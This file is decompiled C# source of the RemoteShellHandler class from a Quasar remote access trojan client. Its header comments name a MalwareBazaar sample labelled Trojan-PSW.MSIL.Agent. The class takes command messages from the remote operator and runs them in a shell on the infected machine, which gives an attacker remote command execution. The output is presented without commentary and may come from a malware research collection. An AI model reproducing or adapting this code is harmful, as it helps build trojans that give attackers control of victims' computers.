// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.RemoteShellHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.IO;
using Quasar.Client.Networking;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;

namespace Quasar.Client.Messages
{
  public class RemoteShellHandler : IMessageProcessor, IDisposable
  {
    private Shell _shell;
    private readonly QuasarClient _client;

    public RemoteShellHandler(QuasarClient client)
    {
      this._client = client;
      this._client.ClientState += new Quasar.Client.Networking.Client.ClientStateEventHandler(this.OnClientStateChange);
    }

    private void OnClientStateChange(Quasar.Client.Networking.Client s, bool connected)
    {
      if (connected)
        return;
      this._shell?.Dispose();
    }

    public bool CanExecute(IMessage message) => message is DoShellExecute;

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      if (!(message is DoShellExecute message1))
        return;
      this.Execute(sender, message1);
    }

    private void Execute(ISender client, DoShellExecute message)
    {
      string command = message.Command;
      if (this._shell == null && command == "exit")
        return;
      if (this._shell == null)
        this._shell = new Shell(this._client);
      if (command == "exit")
        this._shell.Dispose();
      else
        this._shell.ExecuteCommand(command);
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      this._shell?.Dispose();
    }
  }
}
